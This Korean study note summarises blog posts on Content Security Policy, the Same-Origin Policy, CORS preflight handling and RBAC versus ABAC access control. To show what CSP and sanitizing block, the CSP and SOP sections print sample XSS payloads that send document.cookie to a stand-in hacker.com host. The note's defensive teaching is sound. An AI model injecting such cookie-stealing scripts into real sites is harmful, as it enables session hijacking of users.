# 리프레시 토큰 기반의 안전한 접근 제어 전략과 소셜 로그인

## 📚 블로그 읽고 Content Security Policy(CSP) 정리해보기 🍠

### 서버에서 HTML 문서를 응답할 때 CSP를 적용하려면 어떤 HTTP 응답 헤더를 설정해야 하나요? 블로그에 나온 Express.js 코드 예시를 기반으로 설명해보세요

1. 설정해야 하는 헤더
   ```jsx
   Content-Security-Policy: 정책 내용
   ```
2. Express.js 예시

   ```jsx
   app.get("/", (req, res) => {
     // CSP 헤더 설정
     res.setHeader(
       "Content-Security-Policy",
       "default-src 'self'; script-src 'self' cdn.jquery.com; img-src 'self' img.myshop.com",
     );

     res.send(`
       <html>
       <body>
           <h1>Hello!</h1>
           <script src="/main.js"></script>
       </body>
       </html>
   `);
   });
   ```

   ```jsx
   // 논스와 같이 쓸 경우
   app.get("/", (req, res) => {
     const nonce = crypto.randomUUID(); // 요청마다 논스 생성

     res.setHeader(
       "Content-Security-Policy",
       `script-src 'nonce-${nonce}'; object-src 'none'; base-uri 'none'`,
     );

     res.send(`
       <html>
       <body>
           <h1>Hello!</h1>
           <script nonce="${nonce}" src="/main.js"></script>
       </body>
       </html>
   `);
   });
   ```

---

### `default-src 'self'` 설정은 브라우저에게 어떤 보안 정책을 의미하나요? 또한 `'self'` 값은 어떤 출처를 포함하거나 제외하나요?

1. 브라우저에게 어떤 의미일까?
   별도로 지정된 지시어가 없는 모든 리소스는 **현재 사이트와 같은 출처에서만 불러올 수 있다**는 규칙이다.
   ```jsx
   Content-Security-Policy: default-src 'self'
   ```
   ```jsx
   ✅ 허용 — 같은 출처
   https://kasa.com/script.js
   https://kasa.com/style.css
   https://kasa.com/logo.png

   ❌ 차단 — 다른 출처
   https://cdn.jquery.com/jquery.js
   https://evil.com/hack.js
   ```
2. `'self'`가 포함하는 것
   같은 **프로토콜 + 도메인 + 포트** 조합
   현재 사이트가 `https://kasa.com` 이라면,
   ```jsx
   ✅ 포함
   https://kasa.com/script.js   → 같은 출처
   https://kasa.com/img/cat.png → 같은 출처
   ```
3. `'self'`가 제외하는 것
   ```jsx
   ❌ 제외
   http://kasa.com/script.js        → 프로토콜이 다름
   https://sub.kasa.com/script.js   → 서브도메인은 다른 출처
   https://kasa.com:8080/script.js  → 포트가 다름
   https://other.com/script.js    → 도메인이 다름
   ```

---

### 블로그에 나온 악성 스크립트(`<script>fetch(...)</script>`)를 주입했을 때 CSP가 어떻게 동작하는지 네트워크 탭과 콘솔 메시지 측면에서 설명해보세요.

1. 상황
   설정한 CSP
   ```jsx
   res.setHeader("Content-Security-Policy", "default-src 'self'");
   ```
   input에 아래를 입력
   ```jsx
   <script>fetch(`http://hacker.com:8081?cookie=${document.cookie}`)</script>
   ```
2. 네트워크 탭
   `hacker.com`으로 네트워크 요청이 발생하지 않는다.
   인라인 스크립트 자체가 실행되지 않기에 `fetch` 요청도 발생하지 않는 것!
3. 콘솔 메시지
   브라우저 콘솔에는 Content Security Policy 경고가 표시된다. “다음 지시자를 위반했기 때문에 인라인 스크립트가 실행되지 않도록 차단했다” 메시지를 볼 수 있다.

---

### 기본 CSP 설정에서 인라인 스타일이 차단된다고 했습니다. 블로그 예시 중 `width:600px`이 적용되지 않는 이유를 설명하세요.

`default-src 'self'`를 설정하면 스크립트뿐만 아니라 인라인 스타일도 기본적으로 차단된다. (`style-src`의 fallback으로도 동작하기 때문)

---

### 구글 애널리틱스, 카카오맵, 외부 API 등이 CSP 때문에 차단될 수 있다고 했습니다. 이러한 현상을 "건물 보안을 강화한다"는 비유와 연결해 설명해보세요.

> “건물 보안을 강화한다고 **모든 출입문을 잠가버리면,** 정작 직원들도 출입하지 못하는 상황이 생긴다.”

CSP도 마찬가지이다.

```jsx
보안을 위해 default-src 'self' 설정
→ 외부 출처 전부 차단
→ 구글 애널리틱스 🚫 차단됨
→ 카카오맵 🚫 차단됨
→ 웹폰트 🚫 차단됨
```

이처럼 악성 스크립트뿐만 아니라 **정상적인 외부 리소스까지 전부 막혀버린다**.

👉 필요한 출처만 허용 목록에 추가해야 한다.

> 모든 문을 잠그되 **직원증(허용 목록)을 가진 사람만 출입 가능**하도록 설정

---

### Report-Only 모드에서는 실제 리소스 실행이 차단되지 않습니다. 그 대신 브라우저와 서버에서 각각 어떤 동작을 수행하나요?

1. 브라우저 동작
   정책을 위반해도 **차단하지 않고 그냥 실행**한다.
   ```jsx
   악성 스크립트 주입
   → 차단 안 함
   → 그냥 실행
   → hacker.com으로 fetch 요청 발생
   → 쿠키 실제로 유출됨
   ```
   대신 콘솔에 경고 메시지를 띄운다.
2. 서버 동작
   브라우저가 정책 위반을 감지하면 **서버의 `/report` 경로로 JSON 보고서를 전송**한다.
   ```jsx
   {
     "effective-directive": "style-src-elem",
     "blocked-uri": "inline",
     "document-uri": "https://example.com"
   }
   ```
   서버는 이 보고서를 받아서 콘솔에 출력하거나 저장한다.
3. 일반 CSP와 비교하기
   |             | 일반 CSP       | Report-Only |
   | ----------- | -------------- | ----------- |
   | 리소스 실행 | 차단           | 허용        |
   | 위반 보고   | 선택적         | 항상 보고   |
   | 용도        | 실제 보안 적용 | 정책 테스트 |

---

### CSP만으로는 CSRF를 막을 수 없다고 했습니다. 블로그에 정리된 다른 보안 조치들(SameSite 쿠키, X-Frame-Options 등) 중 2가지를 설명하세요.

1. SameSite 쿠키

   쿠기가 **어떤 요청에서 전송될지**를 제어하는 속성이다.

   CSRF 공격은 공격자 사이트에서 피해자 사이트로 요청을 보낼 때 쿠키가 자동으로 따라가는 걸 악용한다.

   ```jsx
   공격자 사이트 → 피해자 은행 사이트로 요청
   → 브라우저가 은행 쿠키 자동 전송
   → 사용자인 척 송금 요청 성공 🚫
   ```

   `Samesite`속성을 설정하면,

   ```jsx
   Set-Cookie: sessionId=abc123; SameSite=Strict
   ```

   다른 사이트에서 온 요청에는 쿠키를 아예 안 보낸다.

   ```jsx
   공격자 사이트 → 피해자 은행 사이트로 요청
   → SameSite 설정으로 쿠키 전송 안 됨
   → 인증 실패 → 공격 차단 ✅
   ```

2. Sanitize

   사용자 입력값에서 **악성 코드를 제거하는 과정**이다.

   공격자가 댓글에 이걸 입력하면,

   ```jsx
   <script>fetch(`http://hacker.com?cookie=${document.cookie}`)</script>
   ```

   Sanitizing을 하면 이렇게 변환된다.

   ```jsx
   &lt;script&gt;fetch(...)&lt;/script&gt;
   ```

   브라우저는 `<script>` 태그가 아닌 **그냥 텍스트**로 인식해서 실행이 안된다.

3. X-Frame-Options
   현재 페이지를 `<iframe>` 으로 불러올 수 있는지 제어하는 헤더
   클랙재킹 방어 목적이다.
   ```jsx
   X-Frame-Options: DENY        # 어디서도 iframe 불가
   X-Frame-Options: SAMEORIGIN  # 같은 출처만 iframe 가능
   ```
   이는 `frame-ancestors` 와 같은 역할로 `frame-ancestors`가 더 유연하기 때문에 현재는 `frame-ancestors` 사용을 권장한다.
   |           | X-Frame-Options | frame-ancestors |
   | --------- | --------------- | --------------- |
   | 방식      | 별도 헤더       | CSP 지시어      |
   | 유연성    | 낮음            | 높음            |
   | 권장 여부 | 구형            | 권장            |

---

<br>
<br>

## 📚 블로그 읽고 동일 출처 정책(Same Origin Policy) 정리해보기 🍠

### 출처(Origin)는 어떤 세 요소의 조합으로 결정되나요?

출처(Origin)는 아래 세 가지 요소가 **모두 일치**할 때 같은 출처로 판단한다.

| 요소                    | 설명           | 예시                |
| ----------------------- | -------------- | ------------------- |
| **프로토콜** (Protocol) | 통신 방식      | `http`, `https`     |
| **호스트** (Host)       | 도메인 주소    | `store.company.com` |
| **포트** (Port)         | 통신 포트 번호 | `80`, `443`, `8080` |

> 셋 중 하나라도 다르면 → 다른 출처

---

### 출처의 요소가 다른 경우(예: 프로토콜만, 포트만 다른 경우)에 같은 출처인지 아닌지를 예시 3개(같은 출처 1개, 다른 출처 2개)로 설명하세요.

기준 URL: `http://store.company.com/dir/page.html`

- ✅ 같은 출처 - 경로(path)만 다름
  ```jsx
  <http://store.company.com/other/page.html>
  ```

  - 프로토콜(http), 호스트(store.company.com), 포트(80) 모두 동일
  - 경로는 출처 판단 기준에 포함되지 않음 → 같은 출처
- ❌ 다른 출처 — 프로토콜만 다름
  ```jsx
  <https://store.company.com/dir/page.html>
  ```

  - http vs https → 프로토콜이 달라서 다른 출처
- ❌ 다른 출처 — 포트만 다름
  ```jsx
  <http://store.company.com:8080/dir/page.html>
  ```

  - http 기본 포트는 80인데, 8080으로 다름 → 다른 출처

---

### 블로그에 나온 `fetch` 기반 악성 스크립트를 다른 출처로 실행했을 때 브라우저에서 어떤 일이 발생하나요? 네트워크 전송 여부, 응답 사용 가능성, 브라우저 콘솔 메시지 측면에서 서술하세요.

```jsx
// evil.com에서 실행되는 악성 스크립트
fetch("<https://hacker.com/steal?data=>" + document.cookie)
  .then((res) => res.text()) // ← 여기서 차단
  .then((data) => console.log(data));
```

| 측면                     | 발생하는 일                                                                       |
| ------------------------ | --------------------------------------------------------------------------------- |
| **네트워크 전송 여부**   | ✅ 요청 자체는 서버로 전송됨                                                      |
| **응답 사용 가능성**     | ❌ 응답 데이터를 JS에서 읽을 수 없음                                              |
| **브라우저 콘솔 메시지** | ❌ "동일 출처 정책으로 인해 `hacker.com`에 있는 원격 리소스를 차단했다" 오류 출력 |

> 브라우저는 요청이 **나가는 것**은 막지 않고 돌아온 **응답을 JS가 읽는 것**을 막는다.

---

### SOP가 어떻게 Session Hijacking(세션 하이재킹) 시도를 방지하는지 구체적으로 설명하세요. SOP가 차단하는 것과 허용되는 것(예: 네트워크 요청은 나가지만 응답 데이터에 접근 불가)을 포함하세요.

#### Session Hijacking

👉 사용자가 로그인한 세션 쿠키를 공격자가 탈취해서 사용자인 척 행동하는 공격

#### SOP가 막는 시나리오

1. 사용자가 `bank.com`에 로그인 → 브라우저에 세션 쿠키 저장
2. 사용자가 `evil.com` 접속 → `evil.com`의 JS가 브라우저에서 실행
3. `evil.com` JS가 `bank.com`으로 fetch 요청 시도
   → 브라우저가 자동으로 bank.com 세션 쿠키 첨부
   → bank.com서버는 "로그인된 사용자 요청"으로 인식하고 계좌 정보 응답
4. ← SOP가 여기서 차단
   → `evil.com` JS가 응답(계좌 정보)을 읽지 못함

#### SOP가 차단하는 것 vs 허용하는 것

| 구분        | 내용                                                          |
| ----------- | ------------------------------------------------------------- |
| ✅ **허용** | bank.com으로 요청 전송 자체                                   |
| ✅ **허용** | 요청에 세션 쿠키 자동 첨부                                    |
| ✅ **허용** | [bank.com](http://bank.com/) 서버가 응답 돌려보내기           |
| ❌ **차단** | [evil.com](http://evil.com/) JS가 응답 데이터(계좌 정보) 읽기 |

> 요청은 나가지만, 응답 데이터에 접근이 불가능하기 때문에 공격자가 실질적인 데이터를 얻을 수 없다.

---

### 블로그에서 명시한 대로 SOP가 반드시 동일 출처에서만 접근하도록 하는 주요 브라우저 API/리소스 3가지를 쓰고, 각각에 대해 간단한 설명(왜 제한되는지)을 덧붙이세요.

#### 1️⃣ `fetch()` API

```jsx
// ❌ 다른 출처에서 응답 읽기 시도 → 차단
fetch("<https://other-origin.com/api/data>").then((res) => res.json()); // CORS 에러
```

**제한 이유**

- 응답 데이터를 JS로 읽어서 처리할 수 있기 때문이다.
- 공격자가 사용자의 로그인 정보를 이용해 민감한 데이터를 탈취하는 데 직접적으로 쓰일 수 있다.

---

#### 2️⃣ `XMLHttpRequest`

```jsx
// ❌ 다른 출처로 XHR 요청 → 응답 읽기 차단
const xhr = new XMLHttpRequest();
xhr.open("GET", "<https://other-origin.com/data>");
xhr.onload = () => {
  console.log(xhr.responseText); // 차단됨
};
xhr.send();
```

**제한 이유**

- JS로 다른 출처의 응답을 읽어서 처리할 수 있는 API이기 때문에 제한된다.
- `fetch()`가 나오기 전부터 사용된 구버전 방식이지만 동일하게 SOP가 적용된다.

---

#### 3️⃣ `@font-face` 웹 폰트

```css
/* ❌ 다른 출처의 폰트 로드 시도 → 차단될 수 있음 */
@font-face {
  font-family: "MyCustomFont";
  src: url("<http://other-origin.com/MyCustomFont.woff2>");
}
```

**제한 이유**

- 폰트 파일도 서버 리소스이기 때문에, 무단으로 가져가는 것을 방지한다.
- 단, 브라우저마다 정책이 달라서 일부 브라우저는 허용하기도 한다.

---

### SOP와 CSP의 차이를 블로그 내용에 따라 요점 4개(각 항목 1문장)로 정리하세요. (예: 누가 적용하는가, 제어 주체, 설정 가능 여부 등)

| 구분                | SOP                                    | CSP                                      |
| ------------------- | -------------------------------------- | ---------------------------------------- |
| **누가 적용하는가** | 브라우저가 자체적으로 적용             | 서버가 설정하고 브라우저가 실행          |
| **제어 주체**       | 개발자가 직접 제어 불가                | 개발자가 HTTP 응답 헤더로 직접 설정      |
| **설정 가능 여부**  | 별도 설정 없이 모든 페이지에 자동 적용 | 각 서비스 요구사항에 맞게 맞춤 설정 가능 |
| **유연성**          | 브라우저별 세부 동작이 약간씩 다름     | Report-Only 모드로 단계적 적용 가능      |

---

### 브라우저에서 SOP 관련 차단 오류를 발견했을 때(예: 콘솔에 “동일 출처 정책으로 인해 ... 차단했습니다” 메시지) 문제 원인 파악을 위한 체크리스트(최소 3항목)를 작성하고, 임시·영구 대응 방안(각 1~2줄)도 제시하세요.

#### 문제 원인 파악 체크리스트

☐ 출처(Origin)가 정말 다른가?

- 프로토콜 / 호스트 / 포트 세 가지를 각각 확인
  예: http vs https, localhost:3000 vs localhost:8080

☐ 2. 서버 응답에 CORS 헤더가 있는가?

- 브라우저 개발자도구 → Network 탭 → 해당 요청 클릭 ->
  Response Headers에서 Access-Control-Allow-Origin 확인

☐ 3. credentials(쿠키) 포함 요청인데 서버 설정이 맞는가?

- credentials: 'include' 사용 시
  - Access-Control-Allow-Origin이 \* 이면 안 됨 (특정 출처 명시 필요)
  - Access-Control-Allow-Credentials: true 도 필요

#### 대응 방안

**임시 대응 (개발 중)**

```jsx
// Vite 기준 — vite.config.ts에서 프록시 설정
// 브라우저 입장에서 같은 출처처럼 보이게 우회
export default {
  server: {
    proxy: {
      "/api": {
        target: "<http://localhost:8080>",
        changeOrigin: true,
      },
    },
  },
};
```

> 개발 환경에서만 쓰는 방법. 실제 배포 환경에서는 서버에서 CORS를 설정해야 한다.

**영구 대응 (서버에서 CORS 설정)**

```jsx
// Node.js/Express 서버 예시
const cors = require("cors");

app.use(
  cors({
    origin: "<https://my-site.com>", // 허용할 출처 명시
    credentials: true, // 쿠키 포함 요청 허용
  }),
);
```

> 근본적인 해결책. 서버에서 신뢰할 수 있는 출처를 명시적으로 허용해주는 방법이다.
> `origin: '*'` 는 모든 출처를 허용하는 것이라 보안상 위험하므로 특정 출처를 명시하는 게 좋다.

---

<br><br>

## 📚 블로그 읽고 교차 출처 리소스 공유(CORS) 정리해보기 🍠

### 브라우저에서 `http://localhost:8080` 애플리케이션이 `http://localhost:8081/resource.json`을 요청했을 때, 네트워크 요청과 응답은 어떻게 처리되며, 브라우저가 응답 본문을 사용하지 못하는 이유는 무엇인가요?

포트가 다르기 때문에 (`8080` vs `8081`) 다른 출처로 간주된다.

네트워크 요청과 응답: **정상적으로 이루어진다.**
서버는 응답을 보내고, 브라우저도 응답을 받는다.
하지만 브라우저가 응답 헤더에서 `Access-Control-Allow-Origin` 을 확인했을 때 해당 헤더가 없거나 출처가 일치하지 않으면, **브라우저가 JS에 응답 본문을 전달하지 않고 차단한다.**

👉 **브라우저가 보안상 응답을 막는 것!**

---

### 서버가 다른 출처(`http://localhost:8080`)에서 자원을 사용할 수 있게 하려면 어떤 응답 헤더를 어떻게 설정해야 하나요? 글의 예시 코드를 참고해 헤더 이름과 값까지 구체적으로 쓰세요.

```
Access-Control-Allow-Origin: http://localhost:8080
```

만일 모든 출처를 허용하려면:

```
Access-Control-Allow-Origin: *
```

---

### 단순 요청으로 분류되기 위해서는 어떤 두 가지 조건을 만족해야 하나요? 또한 `GET /resource.json` 요청이 단순 요청에 해당하는 이유를 설명하세요.

1. 메서드가 `GET` , `POST` , `HEAD` 중 하나일 것
2. 헤더가 브라우저 기본 헤더 + `Accept`, `Accept-Language`, `Content-Language`, `Content-Type`(허용 범위 내) 만 사용할 것

`GET /resource.json`이 단순 요청인 이유는 메서드가 `GET`이고, 별도의 커스텀 헤더 없이 기본 헤더만 사용하기 때문이다.

---

### 브라우저에서 `X-Goguma`라는 커스텀 헤더를 추가했을 때 왜 차단이 발생하나요? 이 문제를 해결하기 위해 서버에서 추가해야 하는 응답 헤더와 값은 무엇인가요?

`X-Goguma`는 브라우저가 기본으로 허용하는 헤더 목록에 없는 커스텀 헤더이다.

단순 요청 조건을 벗어나기 때문에 **Preflight**가 발생하고, 서버가 이 헤더를 허용한다고 명시하지 않으면 차단된다.

따라서 해결을 위해서는 서버 응답에 아래를 추가해야 한다.

```
Access-Control-Allow-Headers: X-Goguma
```

---

### `PUT` 요청을 보낼 때 브라우저는 왜 먼저 `OPTIONS` 요청을 보내나요? 이때 브라우저가 보내는 헤더와 서버가 응답해야 하는 헤더를 각각 쓰고, 사전 요청과 실제 요청이 어떻게 이어지는지 간단히 서술하세요.

`PUT` 은 서버 데이터를 변경할 수 있는 메서드로, 단순 요청 메서드(`GET` , `POST` , `HEAD` )에 해당하지 않는다.

또한 서버에 부수 효과를 일으킬 수 있기 때문에 브라우저가 실제 요청 전에 Preflight로 먼저 허용 여부를 확인한다.

**브라우저가 보내는 Preflight 요청 헤더**

```
OPTIONS /resource HTTP/1.1
Origin: http://localhost:8080
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: content-type
```

**서버가 응답해야 하는 헤더**

```
Access-Control-Allow-Origin: http://localhost:8080
Access-Control-Allow-Methods: PUT
Access-Control-Allow-Headers: Content-Type
```

**흐름**

```
브라우저 → OPTIONS 요청 (Preflight)
서버    → 허용 응답
브라우저 → 허용 확인 후 실제 PUT 요청 전송
서버    → 실제 응답
```

---

<br>
<br>

## 📚 블로그 읽고 ABAC 정리해보기 🍠

### **RBAC**의 한계에 대해 설명해주세요.

- **역할만으로 표현이 안 되는 경우가 생김** <br>
  "원장이지만 삭제 권한이 없는 원장"처럼 같은 역할 안에서도 세부 권한이 달라지는 케이스를 역할만으로 처리할 수 없다.
- **권한 로직이 UI에 흩어짐** <br>
  기능마다 `if (isOwner || isAdmin || isPrincipal ...)` 같은 조건이 여기저기 하드코딩돼서 유지보수가 어렵다.
- **학원 단위 권한 처리 불가** <br>
  한 사람이 여러 학원에 소속되어 학원마다 역할이 다를 수 있는데, 단순 역할 기반으로는 이걸 표현하기 어렵다.

---

### **ABAC**으로의 전환, 어떤 '기준'이 적절할까요?

- 같은 역할인데 권한이 다른 케이스가 생길 때 (ex. 삭제 권한 있는 원장 vs 없는 원장)
- 권한 조건에 역할 외에 리소스 속성이 필요할 때 (ex. "본인 학원의 챌린지만")
- 권한 관련 `if`문이 여러 컴포넌트에 퍼지기 시작할 때

👉 전환 기준: 역할만으로 권한을 설명할 수 없는 예외가 반복해서 생긴다

---

### 어떤 서비스 영역에 **RBAC**을 남겨두고, **ABAC**을 도입하시겠어요?

- **RBAC 유지** — 단순하고 예외가 없는 영역. 예를 들어 `ADMIN`만 접근 가능한 어드민 페이지, 로그인 여부로만 판단하는 기본 접근 제어
- **ABAC 도입** — 조건이 복잡한 영역. 예를 들어 리소스 소유자 여부, 학원별 세부 권한, 특정 속성(`canDeleteChallenge`)에 따라 달라지는 기능

---

### 여러분들은 다른 부서에서 요청을 받았을 때 어떤식으로 행동하실껀가요?

1. **요청의 패턴을 파악** <br>
   "이게 일회성인지, 앞으로도 비슷한 케이스가 생길 것 같은지" 먼저 파악하기
2. **확장 가능성을 질문** <br>
   "앞으로 특정 역할이 삭제할 수 있는 케이스가 추가될까요?"질문과 같이 미리 범위를 확인하기
3. **구조적으로 설계하고 구현** <br>
   단순히 `if` 하나 추가하는 게 아니라, 권한 구조 자체를 확장 가능하게 설계한 뒤 구현하기
4. **테스트 코드로 안전망 확보** <br>
   새 요청을 반영할 때 기존 권한이 깨지지 않도록 테스트 코드를 함께 작성하기
